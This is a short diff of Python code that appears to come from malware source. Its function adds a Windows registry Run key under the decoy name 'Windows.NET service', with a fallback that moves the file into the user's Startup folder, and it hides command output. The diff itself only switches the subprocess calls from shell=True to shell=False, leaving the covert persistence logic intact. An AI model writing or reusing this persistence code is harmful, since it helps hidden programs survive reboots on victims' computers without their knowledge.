@@ -15,9 +15,9 @@ def F7212(exe):
 	new_file_path = fp + "\\" + new_name
 	try:
 		command = 'REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Windows.NET service" /t REG_SZ /f /d "{}"'
-		x1 = subprocess.Popen(command.format( new_file_path ) +">> NUL",shell=True)
+		x1 = subprocess.Popen(command.format( new_file_path ) +">> NUL",shell=False)
 	except:
 		appdata = get_output("echo %APPDATA%")
-		x1 = subprocess.Popen('rename "{}" "{}" >> NUL'.format(new_file_path,appdata+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{}".format( new_name )),shell=True)
+		x1 = subprocess.Popen('rename "{}" "{}" >> NUL'.format(new_file_path,appdata+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{}".format( new_name )),shell=False)
 
 F7212(File)
